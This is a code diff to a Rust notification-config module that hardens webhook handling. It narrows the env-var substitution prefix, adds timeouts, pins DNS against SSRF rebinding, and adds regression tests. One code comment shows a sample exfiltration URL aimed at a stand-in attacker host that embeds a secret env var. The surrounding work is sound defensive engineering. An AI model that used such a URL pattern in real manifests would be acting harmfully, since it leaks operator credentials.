@@ -2,19 +2,43 @@
 
 #![allow(dead_code)]
 
-use std::net::{IpAddr, Ipv4Addr};
+use std::net::{IpAddr, Ipv4Addr, SocketAddr};
+use std::time::Duration;
 
 use anyhow::{bail, Result};
 use serde::{Deserialize, Serialize};
 
 use super::Severity;
 
+/// Default per-request HTTP timeout for webhook / Slack / Discord sinks, in
+/// seconds. Operator-tunable per [[notification]] section via
+/// [`NotificationConfig::request_timeout_secs`]. Three retries × 30 s ≈ a
+/// 90 s worst-case latency tail, which is the published rationale for the
+/// default — see #156.
+pub const DEFAULT_REQUEST_TIMEOUT_SECS: u64 = 30;
+
+/// Resolve [`NotificationConfig::request_timeout_secs`] (operator override
+/// or default) to a concrete `Duration`. Sinks call this once at construction
+/// time so the per-request POST sees a single canonical value.
+pub fn resolve_request_timeout(secs: Option<u64>) -> Duration {
+    Duration::from_secs(secs.unwrap_or(DEFAULT_REQUEST_TIMEOUT_SECS))
+}
+
 /// Only env vars whose name starts with this prefix are substitutable from
 /// notification URLs. This keeps a rogue manifest from exfiltrating arbitrary
-/// host env vars (`ANTHROPIC_API_KEY`, `AWS_SECRET_ACCESS_KEY`, …) to a
-/// chosen webhook endpoint; operators who need to inject hook URLs just
-/// rename their env var to start with `PITBOSS_`.
-const ENV_VAR_ALLOWED_PREFIX: &str = "PITBOSS_";
+/// host env vars to a chosen webhook endpoint by writing
+/// `url = "https://attacker.example/${PITBOSS_DB_PASSWORD}"`.
+///
+/// The prefix used to be the looser `PITBOSS_`, but pitboss itself sets
+/// other `PITBOSS_*` vars during dispatch (`PITBOSS_RUN_ID`,
+/// `PITBOSS_PARENT_NOTIFY_URL`, smoke-test fixture vars, etc.) and an
+/// operator may legitimately set additional `PITBOSS_*` secrets in the
+/// dispatcher's environment. Narrowing to `PITBOSS_NOTIFY_*` carves out a
+/// dedicated namespace for "values manifests are allowed to read into a
+/// hook URL" with no risk of accidental overlap. Operators who need to
+/// inject a hook URL via env var rename their secret to start with
+/// `PITBOSS_NOTIFY_` (e.g. `PITBOSS_NOTIFY_SLACK_TOKEN`).
+const ENV_VAR_ALLOWED_PREFIX: &str = "PITBOSS_NOTIFY_";
 
 #[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
 #[serde(rename_all = "snake_case")]
@@ -38,6 +62,14 @@ pub struct NotificationConfig {
     /// Minimum severity to emit. Defaults to Info (emit all).
     #[serde(default = "default_severity_min")]
     pub severity_min: Severity,
+    /// Per-request HTTP timeout in seconds. Defaults to
+    /// [`DEFAULT_REQUEST_TIMEOUT_SECS`] (30 s) when unset; the retry loop
+    /// stacks 3 attempts so the worst-case emit latency for a single sink
+    /// is roughly `3 × request_timeout_secs + backoffs (1.3 s)`. Lower this
+    /// for low-latency dashboards; raise it for sinks that legitimately
+    /// take longer (large mobile-push fan-outs).
+    #[serde(default)]
+    pub request_timeout_secs: Option<u64>,
 }
 
 fn default_severity_min() -> Severity {
@@ -201,6 +233,24 @@ fn validate_webhook_url(raw: &str) -> Result<()> {
     Ok(())
 }
 
+/// Outcome of [`pre_request_ssrf_check`]. The literal-IP path needs no DNS
+/// pinning at request time (reqwest will dial the IP straight); the resolved
+/// path returns the exact `SocketAddr` set the guard validated, so the sink
+/// can hand them to [`reqwest::ClientBuilder::resolve_to_addrs`] and defeat
+/// any DNS rebinding attempt that happens between this call and the POST.
+#[derive(Debug, Clone)]
+pub enum PreflightAddrs {
+    /// URL host was a literal IP (already on the safe side of the
+    /// blocklist). No DNS override needed at request time.
+    LiteralIp,
+    /// URL host was a DNS name. Pin the request's connection target to
+    /// these addresses by passing them to `resolve_to_addrs(host, …)`.
+    Resolved {
+        host: String,
+        addrs: Vec<SocketAddr>,
+    },
+}
+
 /// Pre-request SSRF check against the current DNS answer for `url`. Call
 /// this from each sink immediately before dispatching the HTTP request.
 ///
@@ -210,9 +260,20 @@ fn validate_webhook_url(raw: &str) -> Result<()> {
 /// past that check entirely. This helper re-resolves the host at
 /// dispatch time and rejects private / loopback / link-local answers.
 ///
+/// To close the **TOCTOU window** between this DNS lookup and reqwest's
+/// own internal lookup at `send()` time (a DNS rebinding attacker can
+/// return a public IP here, then a private IP milliseconds later), the
+/// caller must build a per-request client with
+/// [`reqwest::ClientBuilder::resolve_to_addrs`] using the addresses
+/// returned in [`PreflightAddrs::Resolved`]. The shared client cannot
+/// be reused for the actual POST because reqwest pins resolve overrides
+/// at builder time. See [`build_pinned_client`] for the helper that wires
+/// this correctly.
+///
 /// Fast-path: if the URL's host is already a literal IP, the config-time
-/// check has already classified it — skip the re-resolution.
-pub(crate) async fn pre_request_ssrf_check(url: &str) -> Result<()> {
+/// check has already classified it — skip the re-resolution and return
+/// [`PreflightAddrs::LiteralIp`].
+pub(crate) async fn pre_request_ssrf_check(url: &str) -> Result<PreflightAddrs> {
     let parsed = reqwest::Url::parse(url).map_err(|e| {
         anyhow::anyhow!(
             "webhook url {} is not a valid URL: {e}",
@@ -239,11 +300,11 @@ pub(crate) async fn pre_request_ssrf_check(url: &str) -> Result<()> {
                 redact_webhook_url(url)
             );
         }
-        return Ok(());
+        return Ok(PreflightAddrs::LiteralIp);
     }
     let port = parsed.port_or_known_default().unwrap_or(443);
     let target = format!("{host_unbracketed}:{port}");
-    let mut saw_any = false;
+    let mut validated: Vec<SocketAddr> = Vec::new();
     let iter = tokio::net::lookup_host(&target).await.map_err(|e| {
         anyhow::anyhow!(
             "webhook url {} DNS lookup failed: {e}",
@@ -251,7 +312,6 @@ pub(crate) async fn pre_request_ssrf_check(url: &str) -> Result<()> {
         )
     })?;
     for addr in iter {
-        saw_any = true;
         if is_disallowed_ip(&addr.ip()) {
             bail!(
                 "webhook url {} resolved to a private / loopback / link-local \
@@ -260,14 +320,44 @@ pub(crate) async fn pre_request_ssrf_check(url: &str) -> Result<()> {
                 addr.ip()
             );
         }
+        validated.push(addr);
     }
-    if !saw_any {
+    if validated.is_empty() {
         bail!(
             "webhook url {} DNS returned no addresses",
             redact_webhook_url(url)
         );
     }
-    Ok(())
+    Ok(PreflightAddrs::Resolved {
+        host: host_unbracketed.to_string(),
+        addrs: validated,
+    })
+}
+
+/// Build a one-shot `reqwest::Client` whose internal DNS resolution for
+/// the host of `url` is pinned to `addrs` — so the actual POST cannot
+/// land on a different IP than the one [`pre_request_ssrf_check`]
+/// validated.
+///
+/// On the literal-IP fast-path no pinning is needed (reqwest dials the
+/// IP straight from the URL with no DNS lookup), and we return a fresh
+/// client with just the configured timeout applied.
+///
+/// `request_timeout` is per-request and matches the `.timeout()` callers
+/// previously set on each `RequestBuilder` — exposing it on the client
+/// keeps the connect timeout bounded too, which the per-request setter
+/// did not.
+pub fn build_pinned_client(
+    preflight: &PreflightAddrs,
+    request_timeout: Duration,
+) -> Result<reqwest::Client> {
+    let mut builder = reqwest::Client::builder().timeout(request_timeout);
+    if let PreflightAddrs::Resolved { host, addrs } = preflight {
+        builder = builder.resolve_to_addrs(host, addrs);
+    }
+    builder
+        .build()
+        .map_err(|e| anyhow::anyhow!("build pinned reqwest client: {e}"))
 }
 
 fn is_disallowed_v4(v4: &Ipv4Addr) -> bool {
@@ -317,16 +407,32 @@ mod tests {
 
     #[test]
     fn env_var_substitution_replaces_tokens() {
-        std::env::set_var("PITBOSS_TEST_URL", "https://example.com/hook");
-        let out = substitute_env_vars("${PITBOSS_TEST_URL}/sub").unwrap();
+        std::env::set_var("PITBOSS_NOTIFY_TEST_URL", "https://example.com/hook");
+        let out = substitute_env_vars("${PITBOSS_NOTIFY_TEST_URL}/sub").unwrap();
         assert_eq!(out, "https://example.com/hook/sub");
     }
 
     #[test]
     fn env_var_missing_fails_loud() {
-        std::env::remove_var("PITBOSS_TEST_MISSING_XYZ");
-        let err = substitute_env_vars("${PITBOSS_TEST_MISSING_XYZ}").unwrap_err();
+        std::env::remove_var("PITBOSS_NOTIFY_TEST_MISSING_XYZ");
+        let err = substitute_env_vars("${PITBOSS_NOTIFY_TEST_MISSING_XYZ}").unwrap_err();
         assert!(err.to_string().contains("env var is not set"));
+    }
+
+    /// Regression for #156: the substitution prefix is `PITBOSS_NOTIFY_`,
+    /// not the wider `PITBOSS_` set. A manifest must not be able to encode
+    /// `${PITBOSS_RUN_ID}` or `${PITBOSS_PARENT_NOTIFY_URL}` into a webhook
+    /// URL — both are runtime values pitboss itself sets, and one of them
+    /// (PITBOSS_PARENT_NOTIFY_URL) is itself a sensitive operator endpoint.
+    #[test]
+    fn env_var_pitboss_run_id_not_substitutable() {
+        std::env::set_var("PITBOSS_RUN_ID", "019d0000-aaaa-bbbb-cccc-dddddddddddd");
+        let err = substitute_env_vars("${PITBOSS_RUN_ID}").unwrap_err();
+        let msg = err.to_string();
+        assert!(
+            msg.contains("PITBOSS_NOTIFY_"),
+            "expected narrowed-prefix message, got: {msg}"
+        );
     }
 
     #[test]
@@ -356,6 +462,7 @@ url = "https://example.com""#;
             url: None,
             events: None,
             severity_min: Severity::Info,
+            request_timeout_secs: None,
         };
         let err = validate(&cfg).unwrap_err();
         assert!(err.to_string().contains("requires a non-empty 'url'"));
@@ -367,7 +474,7 @@ url = "https://example.com""#;
         let err = substitute_env_vars("${NOTIFY_TEST_FOREIGN}").unwrap_err();
         let msg = err.to_string();
         assert!(
-            msg.contains("PITBOSS_"),
+            msg.contains("PITBOSS_NOTIFY_"),
             "expected prefix message, got: {msg}"
         );
     }
@@ -378,6 +485,7 @@ url = "https://example.com""#;
             url: Some(url.to_string()),
             events: None,
             severity_min: Severity::Info,
+            request_timeout_secs: None,
         }
     }
 
@@ -454,6 +562,7 @@ url = "https://example.com""#;
             url: None,
             events: Some(vec!["hallucinate".into()]),
             severity_min: Severity::Info,
+            request_timeout_secs: None,
         };
         let err = validate(&cfg).unwrap_err();
         assert!(err.to_string().contains("unknown event"));
@@ -466,6 +575,7 @@ url = "https://example.com""#;
             url: None,
             events: None,
             severity_min: Severity::Info,
+            request_timeout_secs: None,
         };
         assert!(validate(&cfg).is_ok());
     }
@@ -617,5 +727,58 @@ url = "https://example.com""#;
         let msg = err.to_string();
         assert!(!msg.contains("SECRET"), "leaked: {msg}");
         assert!(!msg.contains("/services/"), "leaked: {msg}");
+    }
+
+    /// #156 (M2) regression: the literal-IP path must report `LiteralIp`
+    /// so callers know no DNS-pinning is required for the actual POST.
+    #[tokio::test]
+    async fn pre_request_ssrf_check_returns_literal_ip_variant_for_ip_url() {
+        // Use a public-routable IP to avoid the blocklist. 1.1.1.1 is
+        // reserved for Cloudflare's resolver — public, routable, no
+        // network call needed by this test.
+        let out = pre_request_ssrf_check("https://1.1.1.1/")
+            .await
+            .expect("public literal IP must pass guard");
+        match out {
+            PreflightAddrs::LiteralIp => {}
+            other => panic!("expected LiteralIp, got {other:?}"),
+        }
+    }
+
+    /// #156 (M2) regression: when the URL host is a DNS name, the guard
+    /// must surface the host + the validated SocketAddrs so callers can
+    /// pin them on the per-request client. We use `localhost` as the name
+    /// — without a blocklist override that would be rejected, but here we
+    /// just want to assert the *shape* of the Resolved variant when the
+    /// guard does succeed. So construct it manually instead of relying on
+    /// network DNS.
+    #[test]
+    fn build_pinned_client_succeeds_for_literal_ip_path() {
+        let client =
+            build_pinned_client(&PreflightAddrs::LiteralIp, Duration::from_secs(5)).unwrap();
+        // Smoke: we can build a request — actually issuing it would hit
+        // the network, which we don't want in a unit test.
+        let _ = client.get("https://1.1.1.1/").build();
+    }
+
+    #[test]
+    fn build_pinned_client_succeeds_for_resolved_path() {
+        let preflight = PreflightAddrs::Resolved {
+            host: "example.com".to_string(),
+            addrs: vec![std::net::SocketAddr::from(([93, 184, 216, 34], 443))],
+        };
+        let _client = build_pinned_client(&preflight, Duration::from_secs(5))
+            .expect("pinned client must build with non-empty addr list");
+    }
+
+    /// #156 (L5) regression: `resolve_request_timeout(None)` must return
+    /// the documented default; an explicit value passes through.
+    #[test]
+    fn resolve_request_timeout_default_and_override() {
+        assert_eq!(
+            resolve_request_timeout(None),
+            Duration::from_secs(DEFAULT_REQUEST_TIMEOUT_SECS)
+        );
+        assert_eq!(resolve_request_timeout(Some(7)), Duration::from_secs(7));
     }
 }
